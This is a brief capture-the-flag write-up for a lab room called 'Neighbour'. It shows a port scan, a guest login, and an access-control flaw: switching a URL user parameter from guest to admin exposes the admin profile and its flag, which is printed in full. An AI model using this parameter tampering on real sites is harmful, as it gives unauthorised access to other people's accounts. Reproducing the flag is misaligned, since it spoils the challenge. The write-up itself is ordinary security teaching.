# Neighbour

Nmap scan 

```abap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```
We have a login page at `http://Neighbour.thm` that we can get into as guest as well

So type `guest:guest` we get this page

```abap
Hi, guest. Welcome to our site. Try not to peep your neighbor's profile.
```

But noticing we see this 

```abap
http://neighbour.thm/profile.php?user=guest
```

Switching the user parameter to admin we get the flag 

```abap
http://neighbour.thm/profile.php?user=admin
```

> flag{66be95c478473d91a5358f2440c7af1f}
>
